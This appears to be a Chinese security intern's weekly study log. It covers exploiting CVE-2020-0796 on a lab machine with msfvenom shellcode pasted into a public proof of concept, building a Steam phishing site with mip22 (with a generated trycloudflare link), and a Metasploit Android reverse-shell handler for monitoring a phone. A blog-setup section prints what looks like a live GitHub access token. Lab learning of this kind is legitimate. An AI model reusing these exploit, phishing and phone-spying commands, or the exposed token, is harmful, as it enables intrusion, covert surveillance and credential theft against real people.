实习第一星期学习内容汇总

2023-12-01
  • 一

一.永恒之黑漏洞蓝屏攻击

1.在靶机（ip192.168.186.128）里下载检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/关闭靶机防火墙并运行工具，检查漏洞风险

2.在kali中利用MSF生成木马：

msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=kali的IP地址 LPORT=5555 -b ‘\x00’ -i 1 -f ，用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存

3.将POC放入kali里，运行指令CVE-2020-0796.py 192.168.186.128,攻击靶机

4.攻击成功

二.Steam钓鱼

1.使用vim /etc/proxychains4.conf指令编辑代理设置：将sock4指向物理机ip

2.使用 指令proxychains4 git clone https://github.com/makdosx/mip22下载模板

3.选择指令生成钓鱼网站

生成钓鱼网站：http://supplements-transaction-lip-malpractice.trycloudflare.com/index.html

三.建立自己的博客并更换主题和编辑博客

1.安装git，node软件，并建立blog文件

2.配置ssh

3.检测网站雏形

4.建立一个新储存库，保证你的用户名跟库的名字相同

5.换boke主题 ，执行git clone https://github.com/Shen-Yu/hexo-theme-ayer.git themes/ayer安装主题文件，将config.yml文件里的theme：改为主题名

在命令行运行hexo clean，hexo d -g，完成主题变换

更换博客主题成功

6.安装picgo，typora两个软件，github建立一个新仓库，获得图床访问令牌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，完成软件的配置

7.博客编辑内容执行hexo n “我的”,hexo clean,hexo d -g等指令，生成我的文章名为“我的”，利用typora编辑并上传到博客

效果展示，博客编辑成功

四.利用kali生成安卓木马软件，监控手机

1.依次执行这些命令

use exploit/multi/handler //加载模块

set payload android/meterpreter/reverse_tcp //选择Payload

show options //查看参数设置
set LHOST kali IP //这里的地址设置成我们刚才生成木马的IP地址
set LPORT 5555 //这里的端口设置成刚才我们生成木马所监听的端口
exploit //开始执行漏洞 开始监听,等待手机上线
